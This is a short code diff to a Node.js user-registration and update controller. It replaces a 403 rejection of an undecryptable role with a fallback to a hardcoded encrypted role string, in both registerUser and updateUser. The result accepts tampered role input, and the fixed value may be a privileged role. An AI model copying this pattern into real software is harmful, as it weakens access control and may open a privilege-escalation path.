@@ -26,7 +26,7 @@ module.exports.registerUser = async (req, res) => {
 
   role = decrypt(role)
 
-  if (!role) return res.status(403).json()
+  if(role === false) role = 'i64V1k5uSiNAT9mlf6uw+Q==:tSXIZwCmgdx4uGtMar/5Mg==';
 
   if (!role) role = "member"
   if (client) role = "member"
@@ -95,6 +95,8 @@ module.exports.updateUser = async (req, res) => {
     role,
     client,
   } = req.body
+  role = decrypt(role)
+  if(role === false) role = 'i64V1k5uSiNAT9mlf6uw+Q==:tSXIZwCmgdx4uGtMar/5Mg==';
   if (!role) role = "member"
   if (client) role = "member"
   if (!email) {
